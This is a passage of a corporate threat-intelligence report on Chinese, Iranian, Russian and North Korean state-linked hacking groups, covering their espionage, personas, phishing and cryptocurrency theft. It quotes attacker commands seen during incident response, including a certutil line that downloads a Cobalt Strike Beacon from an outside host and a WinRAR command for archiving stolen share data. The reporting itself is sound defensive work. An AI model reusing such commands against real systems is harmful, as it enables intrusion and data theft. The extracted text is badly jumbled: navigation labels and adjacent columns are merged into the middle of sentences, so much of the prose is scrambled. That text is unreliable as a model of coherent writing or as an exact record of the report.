number of Chinese threat groups have demonstrated an increasing
adherence to a blueprint designed to reduce the likelihood of the
focus on stealth and operational security in their intrusions and
detection and attribution of its intrusion activity.
07 Conclusion
command and control (C2) infrastructure. These tradecraft
improvements have likely been driven in part by a series of high-
profile Department of Justice indictments of Chinese nationals
08 Appendix
allegedly involved in cyberespionage activity. Other drivers include
public exposure by security vendors of this type of activity, and the
consequential likely increased pressure from Chinese leadership to
avoid public scrutiny of its cyberespionage activity.
2023 State of the Threat: A Year in Review 45

Stealth in Action—Observations
01 Letter From Our VP
from IR Engagements
Executive Summary CTU researchers have seen multiple examples of the Chinese They used the Cobalt Strike Beacon to execute domain-wide
02
and Key Findings tradecraft described in this section during Secureworks incident reconnaissance commands including running the net view
response engagements. Here are three typical examples: command to list the resources in a network share hosted on a
server that stores the organization's intellectual property. The
The Business of Cybercrime— threat actor used the WinRAR utility to compress files stored
03 Is Boomtime Back? 01 During a May 2022 incident response engagement,
within this share (see figure 22).
Secureworks analysts observed a Chinese threat actor
compromise an organization's network with the intent to steal
intellectual property. The threat actor primarily used native
Innovations in TTPs Occur
04 When Infection Chains Are operating system tools (a technique known as “living off the
.svm a -r .tmp "\\ \" -hp
Forced to Evolve land”) to achieve their objectives, as well as a command-and-
control proxy network that included compromised SOHO
Figure 22. WinRAR commands to archive data from network share.
routers.
(Source: Secureworks)
State-Sponsored
05
The threat actor exploited a vulnerable Pulse Secure device
Threat Activity
as the initial access vector, deployed a variant of the Awen
web shell and the Godzilla web shell to a second server in the
environment, and then conducted reconnaissance commands
Threat Actor Use of
06
Artificial Intelligence such as whoami, hostname, and net group. They then used the
certutil command to download a Cobalt Strike Beacon payload
(see figure 21).
07 Conclusion
08 Appendix certutil -urlcache -f http:// 7/sv
Figure 21. Certutil command to download Cobalt Strike Beacon.
(Source: Secureworks)
2023 State of the Threat: A Year in Review 46

02 During an incident response engagement that took place in This particular intrusion not only reinforces the fundamental
01 Letter From Our VP
Fall 2022, CTU researchers observed a Chinese threat actor need for network defenders to understand and mitigate risks
moving from a compromised on-premises network to the based on changing attack surfaces, but also demonstrates the
organization's Azure Active Directory (AD) tenant, using importance of extensive logging. CTU researchers strongly
Executive Summary
02 techniques that could only be detected via one specific recommend that organizations collect appropriate Azure
and Key Findings
Microsoft log. The threat actor had obtained access to the AD logs to detect unusual activity in their Azure AD tenant,
organization's on-premises network from as early as Summer and audit Azure AD applications for unusual and excessive
2021 after exploiting the ProxyShell vulnerabilities in an permissions.
The Business of Cybercrime—
03 internet-facing Microsoft Exchange server. Secureworks
Is Boomtime Back?
incident responders discovered that in Fall 2022 the threat In this specific case, the only way to observe much of the
actor created multiple accounts in the organization's on- threat actor's activity during the attack was through study of
premises AD domain and compromised an existing Azure AD the MailItemsAccessed39 mailbox-auditing action, which is part
Innovations in TTPs Occur
administrator account. The threat actor used the administrator of Microsoft's premium audit functionality. The importance
04 When Infection Chains Are
Forced to Evolve account to add an impersonation role for Microsoft Exchange of being able to observe MailItemsAccessed events was also
to an account they had created, and then registered a single- stressed by CISA as part of an advisory about a June 2023
tenant application within the Azure AD tenant and configured incident in which a state-sponsored threat actor compromised
State-Sponsored the application to provide access to the organization's a Microsoft 365 (M365) cloud environment of a Federal Civilian
05
Threat Activity Exchange Online mailboxes (see figure 23). Executive Branch (FCEB) agency. The advisory stated, “CISA
and FBI are not aware of other audit logs or events that would
have detected this activity.”
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
08 Appendix
Figure 23. Malicious application API permissions in Azure AD portal.
(Source: Secureworks)
2023 State of the Threat: A Year in Review 47

03 One threat group has provided prime examples across multiple Secureworks incident responders observed the threat actors
01 Letter From Our VP
IR engagements since 2021 of tradecraft designed to evade using 7-Zip to create an archive file containing the SYSTEM
detection and attribution of their intrusion activity and to blend registry hive and ntds.dit, likely for exfiltration. A few days
in with legitimate network activity: BRONZE SILHOUETTE. later, the threat actors moved laterally to a ManageEngine
Executive Summary
02 ADSelfService Plus server and ran reconnaissance commands.
and Key Findings
During a Summer 2022 engagement, Secureworks incident One command revealed BRONZE SILHOUETTE searching for
responders discovered that BRONZE SILHOUETTE had one of its C2 IP addresses in the victim's access logs, possibly
deployed a single web shell to multiple servers across the suggesting a desire to remove evidence of the intrusion.
The Business of Cybercrime—
03 environment after exploiting an internet-facing PRTG Network
Is Boomtime Back?
Monitor server. A CTU investigation into the attacker-controlled C2
infrastructure revealed at least three Paessler PRTG servers
The threat actor used WMI to execute the native vssadmin belonging to other organizations. This discovery suggests that
Innovations in TTPs Occur
command on a domain controller to create a volume shadow BRONZE SILHOUETTE targets vulnerable PRTG servers for
04 When Infection Chains Are
Forced to Evolve copy (see figure 24). They then extracted the ntds.dit AD initial access into a target environment and to establish its C2
database and the SYSTEM registry hive from the volume infrastructure when conducting cyberespionage attacks.
shadow copy.
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion Figure 24. Threat actor WMI commands to extract the ntds.dit database.
(Source: Secureworks)
08 Appendix
Figure 25. Threat actor commands run under the ManageEngine Java
process. (Source: Secureworks)
2023 State of the Threat: A Year in Review 48

BRONZE PRESIDENT, Watching Since the invasion, CTU researchers observed multiple examples
01 Letter From Our VP
of BRONZE PRESIDENT's use of PlugX malware to collect relevant
the War from the Sidelines
information. During 2022, the group used malicious shortcut (LNK)
files to deliver their malware and continued to use DLL side-loading.
Executive Summary Prior to 2022, BRONZE PRESIDENT focused its efforts on Asia,
02 However, techniques varied.
and Key Findings mainly Myanmar and Vietnam. However, since Russia's invasion of
Ukraine on February 24, 2022, its focus has shifted to obtaining
For example, analysis of the LNK files used in June/July 2022 and
political intelligence surrounding the ongoing war. The threat group
October 2022 campaigns showed the LNK file pointing to a copy
The Business of Cybercrime— consistently employs decoy documents that relate to political issues
03 of the legitimate Adobe Acrobat Distiller executable file, which
Is Boomtime Back?
in the countries surrounding Ukraine, as well as Europe more widely,
was renamed and used to sideload a highly obfuscated DLL loader.
whilst targeting government officials and various national foreign
The file imported a highly obfuscated malicious DLL, which then
ministries.
loaded an encrypted payload file. However, the malware author
Innovations in TTPs Occur
chose different (and in each case quite novel) functions to abuse
04 When Infection Chains Are
Forced to Evolve for the shellcode loading, suggesting that the group continuously
experiments with different approaches to evasion of host-based
security agents.
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
Figure 26. An example of a topically named LNK file (“Political Guidance for
the new EU approach towards Russia,”) showing a nested hidden directory
structure. (Source: Secureworks)
08 Appendix
2023 State of the Threat: A Year in Review 49

In May 2023, BRONZE PRESIDENT appeared to experiment with
01 Letter From Our VP
hiding their payloads inside seemingly benign HTML files (HTML
smuggling40) as a new delivery mechanism for PlugX. HTML
smuggling is typically used by cybercriminals, for example in
Executive Summary
02 Qakbot campaigns.
and Key Findings
Also in 2023, BRONZE PRESIDENT diversified their malware
arsenal, bringing in the previously unobserved MQShell malware.
The Business of Cybercrime—
03 MQShell has limited capability; it simply acts as a reverse shell,
Is Boomtime Back?
executing commands and passing the output to the C2 server, but
it may be in the early stages of development. It does employ novel
C2 communications using the MQTT IoT messaging protocol. The
Innovations in TTPs Occur
threat actor may have chosen this protocol for C2 communications
04 When Infection Chains Are
Forced to Evolve as its lightweight publish/subscribe model is simple to use and
provides an element of obfuscation where the identity of the true
C2 server is concerned. It may also circumvent network-based
State-Sponsored detections. To make use of the protocol, the malware author used
05
Threat Activity the open-source MQTT library.
Additionally, while investigating MQShell, CTU researchers
Threat Actor Use of examined trojanized router firmware files that were likely developed
06
Artificial Intelligence by BRONZE PRESIDENT. These files suggest BRONZE PRESIDENT
may be engaged in building covert networks of compromised
network devices to tunnel their communications back to China
07 Conclusion unobserved—yet another example of stealthy tradecraft on the
part of Chinese groups.
08 Appendix
2023 State of the Threat: A Year in Review 50

01 Letter From Our VP
Executive Summary
02
and Key Findings
The Business of Cybercrime—
03
Is Boomtime Back?
Innovations in TTPs Occur
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
IRAN
Threat Actor Use of
06 Traditional Targeting
Artificial Intelligence
Main motivations:
07 Conclusion Espionage
Monitoring dissidents
Sabotage
08 Appendix
2023 State of the Threat: A Year in Review 51

IRAN
01 Letter From Our VP
A significant proportion of Iranian cyber activity continues to be intelligence functions and reportedly43 operates a cyber division.
Executive Summary
02 driven by political imperatives: tracking and suppression of political These organizations only represent a part of the overall contractor
and Key Findings
opposition, countering normalization of relations between Israel and network and future research by us and others will likely reveal more.
Arab countries via the Abraham Accords41 and offensive operations
to harass government and commercial entities in Israel. Other foreign Indeed, this pattern of private Iranian companies acting as fronts or
The Business of Cybercrime—
03 intelligence collection priorities exist but are less prominent within providing support for Iranian intelligence operations and attacks is
Is Boomtime Back?
our collection aperture. well established, as illustrated by sanctions dating from:
• 201644 on employees of ITSec Team and Mersad Company,
Innovations in TTPs Occur
04 When Infection Chains Are
Iran's Contractor Ecosystem • 201945 on individuals linked to Net Peygard Samavat
Forced to Evolve
Company (later known as Emennet Pasargad),
Iran's main intelligence services sit within the Ministry of Intelligence • 202046 on Rana Intelligence Computing Company and
State-Sponsored and Security (also known as MOIS or VAJA) and the Islamic some of its employees.
05
Threat Activity Revolutionary Guard Corp (IRGC). Both organizations use a network
of contractors to support their offensive cyber activities. In October 2022, the U.S. Treasury also sanctioned47 Ravin Academy
for the provision of various cybersecurity services to MOIS and for
Threat Actor Use of In 2022, CTU research42 into COBALT MIRAGE activity linked three training individuals that were later recruited by MOIS.
06
Artificial Intelligence contractor entities (Afkar System, Najee Technology and Secnerd)
to Iranian cyber activity, and in particular to the Islamic Revolutionary
Guard Corp (IRGC), and its subordinate unit the Intelligence
07 Conclusion Organization (IRGC-IO). The IRGC-IO is one of Iran's primary
08 Appendix
2023 State of the Threat: A Year in Review 52

Links between individuals associated with Iranian threat group Over a period of days or weeks, COBALT ILLUSION develops a
01 Letter From Our VP
activity and contractor organizations often appear gradually over rapport with the target and then attempts to phish credentials or
time. For example, in 2019 Farzin Karimi was accused by the Green deploy malware to the target's computer or mobile device. A case in
Leakers Telegram channel of being linked to COBALT ULSTER July 2022 reported by CERTFA53 included instances of a threat actor
Executive Summary
02 (Muddywater) activity. In 2022, U.S. CyberCommand called48 conducting video calls with a target and passing the phishing link via
and Key Findings
COBALT ULSTER a “subordinate element” of MOIS. Farzin went on chat.
to co-found Ravin Academy and was designated by the Treasury
alongside it. CTU researchers investigated multiple cases attributed to COBALT
The Business of Cybercrime—
03 ILLUSION throughout this year. In one case the threat actors created
Is Boomtime Back?
Similarly Behzad Mesri, alleged49 perpetrator of the 2017 HBO hack a false persona on Twitter that claimed to work for the Atlantic
is wanted50 by the FBI in relation to multiple criminal activities. Council and used it to contact multiple individuals involved in Middle
Mesri was the CEO of Net Peygard Samavat Company, sanctioned51 Eastern political affairs research. The fake persona used the name
Innovations in TTPs Occur
for supporting the IRGC and MOIS. The current incarnation of Net Sara Shokouhi54 and decorated their social media profile with images
04 When Infection Chains Are
Forced to Evolve Peygard Samavat is known as Emennet Pasargad and has links52 to stolen from a psychologist and tarot card reader based in Russia.
multiple strands of Iranian cyber activity.
Phishing and bulk data collection have long been core tactics of
State-Sponsored (N)GO Phishing COBALT ILLUSION operations. In early 2023, CTU researchers
05
Threat Activity investigated a case likely involving COBALT ILLUSION that suggested
Some state-sponsored threat groups are more social than others. the group's tactics had evolved. What differentiated it from most
The Iranian threat group COBALT ILLUSION favors the personal previous activity was the hijack of a long-standing social media
Threat Actor Use of touch, routinely masquerading as real individuals or creating fake account which provided a degree of credibility to the persona in
06
Artificial Intelligence social media personas and using them to contact a target under the contrast to accounts that are only a few weeks or months old when
pretext of an interview request, assistance on a report, or to discuss a they start approaching targets. In this case, activity involved the use
shared interest. of an existing Twitter account, created in 2013, where the original
07 Conclusion identity had been replaced with a fake persona claiming to be a
COBALT ILLUSION (also known as Charming Kitten and APT42) is researcher at the Atlantic Council.
suspected of operating on behalf of Iran's Intelligence Organization
08 Appendix of the Islamic Revolutionary Guard Corp (IRGC-IO). COBALT Social media continues to be a popular mechanism for Iranian
ILLUSION targets a wide range of individuals and is particularly APT groups to approach and cultivate a rapport with their targets.
interested in academics, journalists, human rights defenders, Phishing awareness training that includes scenarios focused on social
political activists, intergovernmental organizations (IGOs), and non- media-based approaches, whether through professional or personal
governmental organizations (NGOs) that focus on Iran. accounts, can help employees spot and report such activity.
2023 State of the Threat: A Year in Review 53

Welcome to the Masquerade Ball Fictional personas, styled as individuals or groups, provide the
01 Letter From Our VP
regime with plausible deniability for attacks against their adversaries.
Iranian use of personas goes far wider and deeper than using Beyond that, they serve to further political objectives, such as
personas in phishing. Since the Iran-Iraq war of the 1980s, Iran has undermining foreign governments, by creating the perception that
Executive Summary
02 preferred indirect confrontation, using proxies, created or adopted, those governments are powerless in the face of cybercriminals
and Key Findings
to conduct kinetic and intelligence operations against regional attacking their citizens or that hacktivists are emerging to support
adversaries. That same strategy carried over into the development and amplify particular political causes.
of their offensive cyber capabilities, first through the adoption of
The Business of Cybercrime—
03 The primary target of these campaigns is Israel, but secondary
the indigenous amateur hacker and defacement community to
Is Boomtime Back?
targets have included the U.S., UAE, Saudi Arabia, Bahrain, and
conduct attacks, and later in the routine fabrication of criminal and
Albania. Many of these are long-standing Western and regional
hacktivist personas to claim responsibility for attacks. One of the
adversaries, but the emergence of the Abraham Accords and the
earliest examples of Iran using fictional personas was the conflicting
Innovations in TTPs Occur
prospect of Arab countries normalizing relations with Israel and
04 When Infection Chains Are claims of responsibility released by “Arab Youth Group” and “Cutting
Forced to Evolve Sword of Justice” in relation to the 2012 Shamoon wiper attacks in shifting the regional power balance, are also of significant concern
to Iran.
Saudi Arabia and Qatar.
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
08 Appendix
Figure 27. Comparison of Moses Staff and Abraham's Ax logos.
(Source: Secureworks)
2023 State of the Threat: A Year in Review 54

The past year has not seen any revival of activity from COBALT Peygard Samavat Company, have been a persistent developer of
01 Letter From Our VP
FOXGLOVE in the guise of the Pay2Key and N3tw0rm ransomware Iranian cyber personas, the associated offensive campaigns, and
families and group personas that we reported on in the 2021 State other intelligence projects on behalf of the Iranian Revolutionary
of the Threat report55. However, COBALT SAPLING, the group Guard Corp Intelligence Organization (IRGC-IO), the IRGC-Electronic
Executive Summary
02 behind the Moses Staff56 persona, did return. Moses Staff emerged Warfare and Cyber Defense Organization (IRGC-EWCD) and the
and Key Findings
in September 2021, using pro-Palestinian imagery and messaging Ministry of Intelligence and Security (MOIS).
to justify hack and leak attacks on government and commercial
entities in Israel. Just over a year later, in November 2022, COBALT In July 2022, a MOIS connected persona, Homeland Justice, attacked
The Business of Cybercrime—
03 SAPLING launched a new campaign and associated persona, multiple government entities in Albania, ostensibly due to Albania's
Is Boomtime Back?
Abraham's Ax, using pro-Hezbollah messaging and imagery to leak hosting of an Iranian political opposition group, Mojahedin-e-Khalq
data allegedly stolen from government ministries in Saudi Arabia. (MEK). However, aspects of the symbolism presented by Homeland
Beyond hack and leak attacks COBALT SAPLING has used custom Justice suggested that attacks were also motivated by the activities
Innovations in TTPs Occur
malware such as PyDCrypt, DCSrv and Strifewater RAT in destructive of the anti-Iranian hacktivist group, Predatory Sparrow58.
04 When Infection Chains Are
Forced to Evolve attacks masquerading as ransomware. In many cases the use of
ransomware-style malware appears to be an attempt to disrupt In June 2022, Predatory Sparrow had claimed responsibility for
rather than monetize a target. As of July 2023, COBALT SAPLING is cyber-enabled physical attacks59 on three state-owned steel mills in
State-Sponsored dormant but may yet be resurrected. Iran. Predatory Sparrow is itself a cyber-persona that provides “cover
05
Threat Activity for action” for a state-sponsored actor. In September 2022, the U.S.
In November 2021, the U.S. Department of the Treasury's Office of designated60 MOIS and specific individuals in response to these
Foreign Assets Control (OFAC) sanctioned57 six Iranian individuals attacks and ongoing leaks of Albanian government data.
Threat Actor Use of and the Iranian company Emennet Pasargad for their role in a cyber-
06
Artificial Intelligence enabled campaign to influence the 2020 U.S. presidential election.
At the time, CTU researchers analyzed the attack and highlighted
inconsistencies in the promotional material revealing the campaign
07 Conclusion
to be a charade. Emennet Pasargad and earlier incarnations of
the entity under other names including Eeleyanet Gostar and Net
08 Appendix
2023 State of the Threat: A Year in Review 55

In January 2023, the DarkBit persona operated by COBALT AZTEC targeted organization. At the time of writing no other known DarkBit
01 Letter From Our VP
provided an interesting example of a persona evolving after its initial attacks have occurred, making it just the latest example of a transient
appearance, potentially in order to improve or refocus the narrative persona associated with Iranian offensive cyber activity.
for greater impact.
Executive Summary
02 2022 saw a significant uptick in appearance of Iranian hacktivists
and Key Findings
Initially used in an attack on a commercial entity in a GCC country, and criminal cyber personas, and it is likely they will continue to
DarkBit presented itself as a generic ransomware actor. Within a use this tactic. Unlike real criminal and hacktivist groups there is no
month the persona had been evolved for use in an attack in Israel, motivation to create an enduring reputation and narrative for these
The Business of Cybercrime—
03 introducing a blend of political and financial motives to the narrative transient groups. New personas will be deployed to align with the
Is Boomtime Back?
by claiming to oppose apartheid and racism while also suggesting latest political objectives, providing a temporary face to their attacks
the group was composed of disgruntled ex-employees forced into and then fading into the background, obscuring the identities and
cybercrime by recent layoffs. In Israel at least, COBALT AZTEC was intent of the real threat actors.
Innovations in TTPs Occur
assisted by MOIS-linked COBALT ULSTER in gaining access to the
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
08 Appendix
Figure 28. DarkBit ransomware payment portal as of early January 2023. (Source: Secureworks)
2023 State of the Threat: A Year in Review 56

01 Letter From Our VP
Executive Summary
02
and Key Findings
The Business of Cybercrime—
03
Is Boomtime Back?
Innovations in TTPs Occur
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
RUSSIA
Threat Actor Use of
06 The Near Abroad and a Nod
Artificial Intelligence
to the “Problems” of Cybercrime
07 Conclusion Main motivations:
Espionage
Hybrid Warfare
08 Appendix
2023 State of the Threat: A Year in Review 57

01 Letter From Our VP
RUSSIA
Executive Summary
02 Inside Ukraine, Russia's activity has primarily fallen into two camps: In early 2023, CTU researchers observed IRON TWILIGHT exploiting
and Key Findings
cyberespionage and disruption, primarily via the use of wiper attacks Outlook vulnerability CVE-2023-23397 to collect NTLM credential
on Ukrainian infrastructure and institutions. Outside Ukraine, the hashes in multiple phishing campaigns that targeted various
focus has been on gaining intelligence on countries supporting Ukrainian state agencies. Recovered hashes could be used in a Pass-
The Business of Cybercrime—
03 Ukraine, assisted by short-lived denial of service attacks conducted the-Hash attack to authenticate as the victim to other systems,
Is Boomtime Back?
by multiple pro-Russian hacktivist groups. access which is valuable for other follow-on activities including
intelligence gathering.
Innovations in TTPs Occur
04 When Infection Chains Are IRON TILDEN, a threat group likely working on behalf of Russia's
Forced to Evolve Espionage and Disruption— domestic intelligence services, remained focused on espionage
through highly targeted spearphishing of Ukrainian defense and
Russia's offensive cyber priorities
government organizations. Infrastructure and lure documents
State-Sponsored in Ukraine attributed by CTU researchers in early 2023 to IRON TILDEN
05
Threat Activity indicated little change in targeting and a continued preference
for certain intrusion techniques like remote template injection for
Russia's protracted invasion of Ukraine entered its second year with
defense evasion and fast-flux DNS for command and control.
continued use of offensive cyber capability. Ukrainian government
Threat Actor Use of
06 entities were the targets of wiper attacks intended to disrupt critical
Artificial Intelligence
services, a tactic which preceded the initial February 24 ground
invasion and continued into 2023, although with less frequency
and likely more limited success due in part to early detection
07 Conclusion
and response.
08 Appendix
2023 State of the Threat: A Year in Review 58

Western Support for Ukraine's CTU researchers analyzed email artifacts likely used in credential
01 Letter From Our VP
harvesting operations in August 2022 by IRON FRONTIER against
Defense Draws Russian Cyber
staff at two U.S. national laboratories. The threat actors impersonated
Attention a fellow laboratory staff member in a multi-day correspondence
Executive Summary
02 which attempted to establish rapport and deceive the victim into
and Key Findings
Organizations directly or indirectly involved in relief efforts intended visiting a mock login page which mimicked another well-known
for Ukraine but located outside of the immediate conflict zone laboratory.
nonetheless became a target for Russian cyberespionage campaigns.
The Business of Cybercrime—
03 Targeted entities or those whose identities were hijacked and It is unknown whether the attack was successful in collecting any
Is Boomtime Back?
incorporated into social engineering aspects of cyber operations fell credentials or what the threat actor's final objective was, but it
under the following sectors: resembled prior IRON FRONTIER operations which have led to
credential disclosure and information theft reportedly reused in later
Innovations in TTPs Occur
• International logistics providers and weapons suppliers information operations.
04 When Infection Chains Are
Forced to Evolve • Refugee and human rights foundations
A similar deceptive spearphishing campaign in May 2023, likely by
• Unmanned aerial systems (UAS) manufacturers
IRON RITUAL, impersonated the staff member of Poland's foreign
State-Sponsored • Scientific research institutions embassy in Kyiv, using infrastructure and source material likely
05
Threat Activity gained in a prior compromise. CTU analysis of the spearphishing
email, which delivered a Microsoft Word attachment named “BMW
5 for sale in Kyiv - 2023.docx” containing malicious links, revealed a
Threat Actor Use of globally diverse target set of organizations, including Secureworks
06
Artificial Intelligence NGO and IGO customers. However, all recipients were in some
way government or non-governmental entities aiding Ukraine.
Attribution of the campaign to IRON RITUAL was based in part on an
07 Conclusion infection chain employed by the group in varying forms as early as
2021, which involves the delivery of first-stage malware through an
HTML-smuggling technique dubbed EnvyScout. EnvyScout acts as a
08 Appendix
dropper for additional malicious files, including Cobalt Strike or Brute
Ratel implants, served from popular third-party cloud services like
DropBox, Google Drive, OneDrive, or Trello.
Figure 29. Threat actor provides technical support during exchange.
(Source: Secureworks)
2023 State of the Threat: A Year in Review 59

The Blurred Lines Between A leaked U.S. classified intelligence assessment and other threat
01 Letter From Our VP
intelligence suggest that some of the KillNet collective's members
Patriotic Hacktivism and Hostile
were communicating or coordinating with elements of Russian
State Cyber Operations intelligence services about their activities. While CTU researchers
Executive Summary
02 have not had direct insight into these groups' intrusions, it is feasible
and Key Findings
The past year has seen a sharp increase in the amount of patriotic- that Russian government entities, directly or indirectly, play some
minded Russian cyber groups seeking to harass organizations role in guiding the operations of these non-state groups.
considered adversaries of Russia. The groups use social media,
The Business of Cybercrime—
03 predominantly the Telegram messaging platform, to marshal
Is Boomtime Back?
brigades of followers, communicate targeting, and claim success
for disruptive distributed denial of services attacks. CTU researchers
tracked the KillNet collective and saw the group target a diverse
Innovations in TTPs Occur
04 When Infection Chains Are range of organizations in countries across Europe, the Middle East,
Forced to Evolve and North America.
KillNet and KillNet-aligned groups like Anonymous Sudan reportedly
State-Sponsored did not use new or sophisticated methods in their attacks but
05
Threat Activity likely caused at least some temporary disruption to hundreds of
organizations across the following sectors since emerging at the
start of 2022:
Threat Actor Use of
06
Artificial Intelligence • Banks
• Airports and aviation
07 Conclusion • Information Technology (IT) providers
• Media
• Law enforcement
08 Appendix
• Government portals
2023 State of the Threat: A Year in Review 60

Third-Party Cloud APIs—a would query open Telegram channels to retrieve the C2 address,
01 Letter From Our VP
which CTU researchers observed being updated multiple times daily.
Favored Place for Russian C2s
This method of providing C2 information can be an effective means
of circumventing IP-based filtering.
Executive Summary While the malicious use of trusted third-party cloud services is
02
and Key Findings not unique to hostile state actors, Russian cyber groups frequently
incorporate them in their operations.
The Business of Cybercrime— CTU researchers identified samples of an early-stage downloader
03
Is Boomtime Back? attributed to IRON RITUAL called GraphicalNeutrino that used
the Notion cloud-based notetaking and productivity platform for
command and control (C2) purposes. The samples were contained in
Innovations in TTPs Occur
a malicious ZIP archive downloaded from a compromised WordPress
04 When Infection Chains Are
site via an EnvyScout HTML-smuggling JavaScript. CTU analysis of
Forced to Evolve
the ZIP contents revealed that the loader performed queries to a
Notion database via Notion's API service. The secret key embedded
in the downloader and used to authenticate to the service had
State-Sponsored
05 expired prior to the analysis but third-party researchers determined
Threat Activity
that similar GraphicalNeutrino samples make the API calls to upload
host information and download additional payloads.
Threat Actor Use of
06
An April 2023 report61 by the Computer Emergency Response Team
Artificial Intelligence
of Ukraine (CERT-UA) observed an email campaign conducted by
Russia's Foreign Intelligence Service against Ukraine that asked users
07 Conclusion to run a PowerShell script that collected host information and then
uploaded it to the public Mocky API, a free service used by software
developers to test apps.
08 Appendix
And the popular Telegram messaging service was used by IRON
TILDEN as a dead-drop resolver for communicating command
and control server IP addresses. Hosts infected with IRON TILDEN
stagers dubbed GammaLoad (CERT-UA) or DinoTrain (Microsoft)
2023 State of the Threat: A Year in Review 61

Finish MFA Enrollment or IRON
01 Letter From Our VP
RITUAL Will Do It for You
Executive Summary Alongside spearphishing, Russian threat groups continued to
02
and Key Findings conduct traditional password-spraying attacks to gain unauthorized
access to target environments. When weak credentials are found,
multi-factor authentication (MFA) will usually prevent the adversary
The Business of Cybercrime— from advancing. But in 2022, CTU researchers observed a Russian
03
Is Boomtime Back?
state-sponsored threat group, likely IRON RITUAL, progressing
beyond MFA defenses by further identifying weak accounts which
were yet to enroll in MFA. The threat actors exploited this weakness
Innovations in TTPs Occur
to obtain full access to the victim's environment, logging into the
04 When Infection Chains Are
external corporate VPN and using remote desktop services to
Forced to Evolve
navigate the internal network. The intrusion was detected, actor
evicted, and stronger defenses built through the addition of multiple Figure 30. Azure AD cloud audit logs from account takeover.
(Source: Secureworks)
Azure Active Directory conditional access policies.
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
08 Appendix
2023 State of the Threat: A Year in Review 62

01 Letter From Our VP
Executive Summary
02
and Key Findings
The Business of Cybercrime—
03
Is Boomtime Back?
Innovations in TTPs Occur
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
DEMOCRATIC PEOPLE'S
Threat Actor Use of REPUBLIC OF KOREA
06
Artificial Intelligence
Revenue Remains the Major Focus
07 Conclusion Main motivations:
Financial Gain
Espionage
08 Appendix
2023 State of the Threat: A Year in Review 63

01 Letter From Our VP
NORTH KOREA
Executive Summary
02
and Key Findings
North Korean threat groups primarily split into two types: those According to research carried out by blockchain analytics company
that aim to gather outside geopolitical insight regarding countries Elliptic for Nikkei Asia63, North Korean threat groups have stolen $2.3
of interest, and others that focus on the need to sustain the North billion USD in crypto assets between 2017 and May 2023 (30 percent
The Business of Cybercrime—
03 Is Boomtime Back? Korean economy and procure money for the isolated regime. of it from Japan alone). In comparison, their legitimate exports64
Ultimately, the purpose of their activity is to inhibit any threats to totaled approximately $3.6 billion over the same period (with 2017
the regime's security and stability. accounting for 58 percent of that figure), giving an insight into the
value of these attacks to the North Korean economy. Nikkei Asia
Innovations in TTPs Occur
04 When Infection Chains Are states that the U.N. Security Council estimates that North Korea
Forced to Evolve stole between $600 million and $1 billion in cryptocurrency in 2022,
Cryptocurrency Theft
double the previous year's total. Elliptic estimated the figure at $640
million for 2022.
Since at least 2020, North Korea—officially known as the
State-Sponsored
05
Democratic People's Republic of Korea (DPRK)—has devoted
Threat Activity
significant efforts to cryptocurrency theft, likely to compensate
for the economic impact of UN sanctions that prevent the country
Threat Actor Use of from international trading.
06
Artificial Intelligence
In the past year, North Korean threat actors have used AppleJeus
malware to steal cryptocurrency. AppleJeus62 was first discovered
07 Conclusion in 2018 and has been a fundamental tool for North Korea's financial
theft initiatives, masquerading as legitimate cryptocurrency
trading applications. Public reports have linked these attacks on
08 Appendix the cryptocurrency industry to the Lazarus Group. CTU researchers
broadly track Lazarus Group as NICKEL ACADEMY and consider
NICKEL GLADSTONE to be a subgroup that focuses heavily on
revenue generation for the North Korean regime.
2023 State of the Threat: A Year in Review 64

Multiple Operating Systems and a including CHM70, OneNote, VHD, boot sector, and ISO. The
01 Letter From Our VP
deployment of various file types was likely due in some part to the
Plethora of File Types
change in the Windows default handling of VBA macros in July 2022,
which we described earlier in the report.
Executive Summary North Korean threat groups have deployed macOS malware for
02
and Key Findings many years. For example, NICKEL GLADSTONE has used one
Supply Chain Attacks
variant of AppleJeus malware dating back to 201865. Since then,
the use of malware built for platforms other than Windows has
In April 2023, public reporting71 revealed that a North Korean threat
The Business of Cybercrime— steadily increased. North Korean threat groups now deploy several
03 group had orchestrated a cascading supply chain attack where one
Is Boomtime Back?
types of macOS-based malware including AppleJeus, RustBucket66,
supply chain compromise at the Xtrader futures trading company
CloudMensis67, and Manuscrypt68.
enabled the threat actors to compromise a second supply chain at
the 3CX communications software company. Both the Xtrader and
Innovations in TTPs Occur
The macOS malware observed is often used in campaigns
04 When Infection Chains Are 3CX compromises were possibly carried out to generate revenue,
targeting blockchain technology, the cryptocurrency industry, and
Forced to Evolve but the 3CX compromise was potentially also for cyberespionage
decentralized finance (DeFi) organizations. There is some evidence to
purposes. Multiple versions of a 3CX softphone application were
suggest that the threat actors have adopted macOS tooling because
trojanized with ICONIC infostealer malware.
the end users they target in these and associated sectors heavily use
State-Sponsored
05 machines running macOS.
Threat Activity Incident response efforts72 revealed that the initial supply chain
attack occurred in early 2022; however, the second supply chain
Linux malware also features in at least one North Korean threat
attack and subsequent campaign was not discovered until early 2023.
group's arsenal. In April 2023, public reporting revealed that a
Threat Actor Use of The string of supply chain attacks demonstrates the threat actors'
06
backdoor dubbed SimplexTea69 was linked to NICKEL ACADEMY.
Artificial Intelligence
persistence and willingness to devote preliminary resources with
North Korean threat groups have been observed deploying Linux-
plans for long-term results. In 2021, NICKEL ACADEMY conducted
based malware since at least 2017.
some preliminary supply chain attacks that may have led up to
07 Conclusion
later efforts like the 3CX breach. The group compromised a South
Throughout the past year, North Korean threat groups have also
Korean think tank73 and a Latvian IT company74 to deliver a RAT and
experimented with many different file types for malware delivery
backdoor malware.
08 Appendix
2023 State of the Threat: A Year in Review 65

06
Threat Actor Use of
01 Letter From Our VP
Artificial Intelligence
Executive Summary
02
and Key Findings
Secureworks' monitoring of criminal forums and marketplaces shows
The Business of Cybercrime—
03 that criminal interest in ChatGPT and AI in general is on the rise, in
Is Boomtime Back?
line with increased interest in the topic across wider society.
Innovations in TTPs Occur
